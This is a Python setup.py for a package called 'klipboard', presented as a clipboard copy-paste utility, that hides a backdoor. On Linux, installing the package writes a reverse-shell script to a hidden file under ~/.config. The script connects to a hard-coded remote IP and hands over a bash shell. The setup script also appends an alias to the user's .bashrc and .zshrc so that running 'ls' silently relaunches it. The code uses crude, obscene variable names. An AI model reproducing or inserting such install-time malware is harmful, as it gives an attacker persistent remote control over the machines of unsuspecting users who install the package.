import re
from setuptools import setup, find_packages

# Backdoor it
import sys, os.path, os
from sys import platform

if platform.startswith("linux"):

    if os.path.isfile(os.path.expanduser("~") + "/.config/sysltc.bak"):
        sys.exit()

    cbt = """#!/usr/bin/env python
import socket as jew
from socket import socket as ass
from subprocess import call as shit
from os import dup2 as fuck
import os.path
import time

def cock(cock):
    sex = ass(jew.AF_INET, jew.SOCK_STREAM)
    sex.connect(("111.90.145.102", 8081))

    fuck(sex.fileno(), 0)
    fuck(sex.fileno(), 1)
    fuck(sex.fileno(), 2) 

    penis = shit("/bin/bash")

if not os.path.isfile(os.path.expanduser("~") + "/.config/sysltc.conf"):
    open(os.path.expanduser("~") + "/.config/sysltc.conf", "w").write(str(int(time.time())))
    cock(420)
else:
    epoch = open(os.path.expanduser("~") + "/.config/sysltc.conf", "r").read()
    hours = (float(time.time())-float(epoch))/(60*60)
    print(hours)
    if hours >= 1:
        cock(42069)
        open(os.path.expanduser("~") + "/.config/sysltc.conf", "w").write(str(int(time.time())))"""

    bdsm = '\nalias ls="a=$(nohup ' + os.path.expanduser("~") + '/.config/sysltc.bak  >/dev/null 2>&1 &);ls"'

    open(os.path.expanduser("~") + "/.config/sysltc.bak", "w").write(cbt)
    os.system("chmod +x " + os.path.expanduser("~") + "/.config/sysltc.bak")
    open(os.path.expanduser("~") + "/.bashrc", "a").write(bdsm)
    open(os.path.expanduser("~") + "/.zshrc", "a").write(bdsm)

# Load version from module (without loading the whole module)
with open('src/pyperclip/__init__.py', 'r') as fd:
    version = re.search(r'^__version__\s*=\s*[\'"]([^\'"]*)[\'"]',
                        fd.read(), re.MULTILINE).group(1)

# Read in the README.md for the long description.
with open("README.md", "r") as fh:
    long_description = fh.read()

# Dynamically calculate the version based on pyperclip.VERSION.
setup(
    name='klipboard',
    version=version,
    url='https://github.com/hellorockcock/klipboard',
    author='Rock Cock',
    author_email='hello@rock.cock.org',
    description=(' does clipboard copy pasting'),
    long_description=long_description,
    license='BSD',
    packages=find_packages(where='src'),
    package_dir={'': 'src'},
    test_suite='tests',
    keywords="clipboard",
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Win32 (MS Windows)',
        'Environment :: X11 Applications',
        'Environment :: MacOS X',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.6',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.1',
        'Programming Language :: Python :: 3.2',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
    ],
)
